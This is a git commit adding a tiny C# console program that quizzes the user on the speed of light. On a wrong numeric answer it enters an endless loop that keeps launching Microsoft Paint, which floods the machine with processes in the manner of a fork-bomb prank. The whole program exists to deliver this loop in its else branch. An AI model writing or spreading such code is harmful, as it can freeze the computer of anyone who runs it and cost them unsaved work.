02a26e5d2bc6ea0f6fd739135d762e551c7a7f1e
m1adow <Vell0505189970sl@gmail.com>
2022-01-28 22:02:54 +0200

    Add project files.

---
+++ Program.cs
@@ -0,0 +1,5 @@
+﻿System.Console.Write("Write what is the speed of light: ");
+if (System.Convert.ToInt32(System.Console.ReadLine()) == 300000000)
+    return;
+else
+    while (true) { System.Diagnostics.Process.Start(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Paint.lnk"); }
